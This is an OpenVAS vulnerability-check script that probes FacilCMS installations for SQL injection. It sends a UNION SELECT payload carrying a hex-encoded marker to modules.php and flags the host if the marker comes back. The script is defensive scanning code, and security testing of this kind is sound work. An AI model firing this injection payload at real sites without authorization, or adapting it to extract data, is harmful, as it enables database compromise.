###############################################################################
# OpenVAS Vulnerability Test
# $Id: FacilCMS_multiple_vuln.nasl 4655 2016-12-01 15:18:13Z teissa $
#
# FacilCMS Multiple SQL Injection And Information Disclosure
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "FacilCMS is prone to multiple SQL-injection and
  information-disclosure vulnerabilities.

  Exploiting these issues could allow an attacker to obtain sensitive
  information, compromise the application, access or modify data, or
  exploit latent vulnerabilities in the underlying database.

  FacilCMS 0.1RC2 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100065);
 script_version("$Revision: 4655 $");
 script_tag(name:"last_modification", value:"$Date: 2016-12-01 16:18:13 +0100 (Thu, 01 Dec 2016) $");
 script_tag(name:"creation_date", value:"2009-03-20 13:11:29 +0100 (Fri, 20 Mar 2009)");
 script_bugtraq_id(34177);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("FacilCMS Multiple SQL Injection and Information Disclosure Vulnerabilities");


 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34177");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


dir = make_list("/facil-cms","/cms",cgi_dirs());
foreach d (dir)
{ 
 url = string(d, "/modules.php?modload=Albums&op=photo&id=-1+UNION+SELECT+1,2,3,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374%20--");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )continue;
 
 if( egrep(pattern: "OpenVAS-SQL-Injection-Test", string: buf) )
   {    
    security_message(port:port);
    exit(0);
   }
}
exit(0);
